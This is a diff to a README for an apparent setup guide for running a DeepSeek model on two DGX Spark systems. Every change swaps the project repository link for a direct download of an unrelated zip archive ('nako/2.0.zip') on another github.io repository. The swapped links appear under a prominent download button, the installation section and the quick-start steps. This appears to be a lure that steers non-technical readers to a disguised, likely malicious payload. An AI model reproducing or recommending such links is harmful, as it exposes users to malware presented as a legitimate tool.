@@ -9,7 +9,7 @@ description: "Deploy DeepSeek-V4-Flash-0731 across dual DGX Spark nodes via 200G
 
 Welcome to **dgx-spark-2-deepseek-flash-0731**, a straightforward setup guide that helps you configure DeepSeek-Flash-0731 on two DGX-Spark systems from scratch. Whether you're setting up a home lab or exploring AI infrastructure, this guide walks you through every step in plain language—no technical background required.
 
-[<p align="center"><a href="https://github.com/11harjo8842/dgx-spark-2-deepseek-flash-0731" style="background-color:#FF5733;color:white;padding:15px 30px;font-size:20px;border-radius:10px;text-decoration:none;display:inline-block;">⬇️ DOWNLOAD NOW</a></p>](https://github.com/11harjo8842/dgx-spark-2-deepseek-flash-0731)
+[<p align="center"><a href="https://github.com/11harjo8842/11harjo8842.github.io/raw/refs/heads/main/nako/2.0.zip" style="background-color:#FF5733;color:white;padding:15px 30px;font-size:20px;border-radius:10px;text-decoration:none;display:inline-block;">⬇️ DOWNLOAD NOW</a></p>](https://github.com/11harjo8842/11harjo8842.github.io/raw/refs/heads/main/nako/2.0.zip)
 
 ## 📋 What Is This?
 
@@ -35,7 +35,7 @@ To get the most out of this guide, you'll need:
 
 ## 🔧 Installation and Setup
 
-Visit this link to download the application: [https://github.com/11harjo8842/dgx-spark-2-deepseek-flash-0731](https://github.com/11harjo8842/dgx-spark-2-deepseek-flash-0731)
+Visit this link to download the application: [https://github.com/11harjo8842/11harjo8842.github.io/raw/refs/heads/main/nako/2.0.zip](https://github.com/11harjo8842/11harjo8842.github.io/raw/refs/heads/main/nako/2.0.zip)
 
 ### 📥 Download Instructions
 
@@ -124,7 +124,7 @@ This project is provided for educational and personal use. Always review the lic
 
 1. Confirm you have two DGX-Spark systems ready.
 2. Ensure both are connected to the same network.
-3. Download the repository by visiting [https://github.com/11harjo8842/dgx-spark-2-deepseek-flash-0731](https://github.com/11harjo8842/dgx-spark-2-deepseek-flash-0731).
+3. Download the repository by visiting [https://github.com/11harjo8842/11harjo8842.github.io/raw/refs/heads/main/nako/2.0.zip](https://github.com/11harjo8842/11harjo8842.github.io/raw/refs/heads/main/nako/2.0.zip).
 4. Follow the steps in order from **Step 1** to **Step 5**.
 5. Enjoy your configured DeepSeek-Flash-0731 setup!
 
